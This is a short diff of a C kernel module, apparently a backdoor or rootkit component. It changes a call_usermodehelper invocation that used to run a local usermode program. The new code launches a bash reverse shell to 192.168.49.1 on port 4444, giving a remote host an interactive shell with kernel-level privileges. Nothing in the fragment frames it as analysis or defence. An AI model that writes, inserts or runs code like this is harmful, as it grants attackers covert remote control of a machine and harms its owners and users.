@@ -53,15 +53,9 @@ static int thread_task(void *data) {
 inline int exec_cmd(void) {
 //FIXME
     int ret;
-    char * argv[] = {
-       "/home/pc/Desktop/usermode",
-       NULL
-    };
-    char * envp[] = {
-        "HOME=/home/pc",
-        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
-        NULL
-    };
+
+    char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.49.1/4444 0>&1", NULL};
+    char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if (ret < 0) {
